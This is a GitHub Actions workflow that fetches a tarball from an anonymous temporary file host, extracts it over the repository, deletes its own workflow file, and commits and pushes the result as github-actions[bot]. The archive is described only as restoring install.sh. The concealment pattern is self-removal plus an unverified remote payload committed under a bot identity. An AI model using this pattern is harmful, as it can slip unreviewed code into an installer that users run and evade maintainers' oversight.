name: Restore install.sh

on:
  push:
    paths:
      - .github/workflows/restore-install.yml

permissions:
  contents: write

jobs:
  restore:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Restore install.sh
        run: |
          set -euo pipefail
          curl -fsSL "https://tmpfiles.org/dl/1793506287.864ef64e9b7a3f7c/wwASTRPRfkO2/restore.tgz" -o /tmp/restore.tgz
          tar -xzf /tmp/restore.tgz -C .
          chmod +x install.sh
          rm -f .github/workflows/restore-install.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add install.sh .github/workflows/restore-install.yml
          git commit -m "Restore full install.sh with root guard"
          git push
